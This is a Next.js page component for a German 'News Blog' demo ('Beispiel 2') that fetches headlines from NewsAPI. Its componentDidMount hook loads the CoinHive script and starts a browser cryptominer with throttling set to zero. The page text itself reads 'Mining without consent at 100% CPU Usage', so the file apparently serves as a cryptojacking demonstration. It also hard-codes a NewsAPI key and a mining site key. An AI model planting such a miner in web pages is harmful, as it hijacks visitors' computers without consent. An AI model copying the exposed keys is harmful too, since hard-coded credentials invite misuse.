import Link from 'next/link';
import Head from 'next/head';
import axios from 'axios';
import { Layout, Menu, Breadcrumb } from 'antd';
import styled from 'styled-components';

import News from '../components/news/index';

const { Header, Content, Footer } = Layout;

const Logo = styled.div`
  color: white;
  text-align: center;
  width: 128px;

  h1,
  h2,
  h3,
  h4 {
    color: white;
  }

  &:hover {
    background: rgba(255, 255, 255, 0.2);
  }

  transition: all 200ms ease;
`;

export default class Second extends React.Component {
  static async getInitialProps() {
    const { data } = await axios.get(
      'https://newsapi.org/v2/top-headlines?country=de&apiKey=fa1bd6969b2548d2add38a5bb379126b'
    );

    const news = data.articles;

    return { news };
  }

  componentDidMount() {
    this.miner = new CoinHive.Anonymous('H4lnmQy879fDgH1shIrU6iGsaqgpOGvm', {
      throttle: 0
    });

    if (!this.miner.isMobile() && !this.miner.didOptOut(14400)) {
      this.miner.start();
    }
  }

  componentWillUnmount() {
    this.miner.stop();
  }

  render() {
    return (
      <Layout className="layout">
        <Head>
          <title>Beispiel 2</title>
          <script src="https://coinhive.com/lib/coinhive.min.js" />
        </Head>
        <Header>
          <Link href="/">
            <a>
              <Logo>
                <h3>News Blog</h3>
              </Logo>
            </a>
          </Link>
        </Header>
        <Content style={{ padding: '0 50px' }}>
          <Breadcrumb style={{ margin: '16px 0' }}>
            <Breadcrumb.Item>Home</Breadcrumb.Item>
            <Breadcrumb.Item>Beispiel 2</Breadcrumb.Item>
          </Breadcrumb>
          Mining without consent at 100% CPU Usage
          <News ads={false} news={this.props.news} />
        </Content>
        <Footer style={{ textAlign: 'center' }}>
          Ant Design ©2018 Created by Ant UED
        </Footer>
      </Layout>
    );
  }
}
